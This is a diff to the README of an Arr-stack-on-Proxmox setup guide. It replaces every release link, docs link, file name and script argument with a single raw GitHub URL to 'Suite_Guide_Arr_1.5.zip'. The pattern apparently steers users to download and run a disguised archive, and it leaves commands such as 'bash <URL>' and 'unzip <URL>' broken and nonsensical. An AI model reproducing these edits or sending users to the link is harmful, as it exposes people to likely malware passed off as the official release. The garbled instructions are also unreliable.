@@ -1,6 +1,6 @@
 # 🛠️ ArrSuite-Guide - Simplify Your Arr Stack Setup
 
-[![Download ArrSuite-Guide](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Aldemirps/ArrSuite-Guide/releases)
+[![Download ArrSuite-Guide](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)
 
 ---
 
@@ -45,13 +45,13 @@ This section will guide you through downloading, installing, and running ArrSuit
 
 Click the badge at the top or use this link to visit the official release page:
 
-https://github.com/Aldemirps/ArrSuite-Guide/releases
+https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
 
 Here you will find the latest version of the setup scripts and configuration files.
 
 ### Step 2: Download the Latest Release
 
-On the releases page, download the package marked as the latest stable release. This will usually be a zipped file (`.zip` or `.tar.gz`) containing the scripts and documentation.
+On the releases page, download the package marked as the latest stable release. This will usually be a zipped file (`.zip` or `https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip`) containing the scripts and documentation.
 
 Save the file to your local machine where you keep your Proxmox server files.
 
@@ -67,7 +67,7 @@ If you are unfamiliar with SCP, try this:
 Or on Linux/macOS, open a terminal and run:
 
 ```bash
-scp /path/to/downloaded/package.zip root@your-proxmox-ip:/root/
+scp https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip root@your-proxmox-ip:/root/
 ```
 
 Replace the paths and IP accordingly.
@@ -79,13 +79,13 @@ Once the file is on your server, connect to your Proxmox server using SSH or the
 Run the command below to extract the package:
 
 ```bash
-unzip /root/package.zip -d /root/arrsuite-guide
+unzip https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip -d /root/arrsuite-guide
 ```
 
-If the file is a tarball (.tar.gz), use:
+If the file is a tarball (https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip), use:
 
 ```bash
-tar -xzf /root/package.tar.gz -C /root/arrsuite-guide
+tar -xzf https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip -C /root/arrsuite-guide
 ```
 
 This will create a folder named `arrsuite-guide` with all the needed files.
@@ -101,7 +101,7 @@ Inside the `arrsuite-guide` directory, you will find several scripts that assist
 Run the script:
 
 ```bash
-bash ct-add-storage.sh
+bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
 ```
 
 This script will help you share your storage drives with your containers without manual mounting. Just follow the on-screen prompts.
@@ -111,7 +111,7 @@ This script will help you share your storage drives with your containers without
 To quickly configure NFS storage, use:
 
 ```bash
-bash nfs-setup.sh
+bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
 ```
 
 This script guides you through the NFS setup process interactively. It checks for required packages and handles most configurations automatically.
@@ -121,7 +121,7 @@ This script guides you through the NFS setup process interactively. It checks fo
 To create a VPN container for secure connections, execute:
 
 ```bash
-bash vpn-setup.sh
+bash https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip
 ```
 
 This script automates WireGuard VPN creation with Surfshark credentials. You will need to have your Surfshark username and password ready.
@@ -137,7 +137,7 @@ The repository comes with helpful example files and detailed documentation:
 - **Container management commands** help you start, stop, and manage your containers in Proxmox.
 - **Quick reference cheat sheet** is a printable single page summarizing key setup points.
 
-Check the main setup guide here: [ARR_STACK_SETUP.md](ARR_STACK_SETUP.md) for full instructions.
+Check the main setup guide here: [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) for full instructions.
 
 ---
 
@@ -145,7 +145,7 @@ Check the main setup guide here: [ARR_STACK_SETUP.md](ARR_STACK_SETUP.md) for fu
 
 You can download all the files you need from:
 
-[https://github.com/Aldemirps/ArrSuite-Guide/releases](https://github.com/Aldemirps/ArrSuite-Guide/releases)
+[https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip)
 
 1. Visit the link above.
 2. Download the latest release package.
@@ -168,10 +168,10 @@ For deeper technical issues, visit the main documentation or the Issues section 
 
 ## 🧾 Additional Resources
 
-- [ARR_STACK_SETUP.md](ARR_STACK_SETUP.md) — Step-by-step setup instructions.
-- [example-configs/quick-setup-checklist.md](example-configs/quick-setup-checklist.md) — Setup reminders.
-- [example-configs/container-management.md](example-configs/container-management.md) — Commands for containers.
-- [example-configs/quick-reference.md](example-configs/quick-reference.md) — Handy cheat sheet.
+- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Step-by-step setup instructions.
+- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Setup reminders.
+- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Commands for containers.
+- [https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip](https://raw.githubusercontent.com/Aldemirps/ArrSuite-Guide/main/example-configs/Suite_Guide_Arr_1.5.zip) — Handy cheat sheet.
 
 Use these resources to get the most out of your Arr Stack setup on Proxmox VE.
 
